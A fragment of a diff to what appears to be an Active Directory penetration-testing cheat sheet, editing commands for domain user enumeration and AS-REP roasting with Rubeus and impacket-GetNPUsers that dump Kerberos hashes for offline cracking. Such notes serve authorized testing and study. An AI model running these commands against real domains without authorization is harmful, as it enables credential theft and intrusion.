@@ -28,7 +28,7 @@ impacket-GetADUsers -all -dc-ip <dc_ip> <domain>/<username>
 #Roasting
 .\Rubeus.exe asreproast /nowrap
 impacket-GetNPUsers.py <domain>/ -usersfile <usernames.txt> - format hashcat -outputfile hashes-asrep
-impacket-GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format hashcat -outputfile hashes-asrep
+impacket-GetNPUsers.py <domain_name>/<domain_user> -request -format hashcat -outputfile hashes-asrep -dc-ip <ip>
 ```
 #### Kerberoasting
 ```
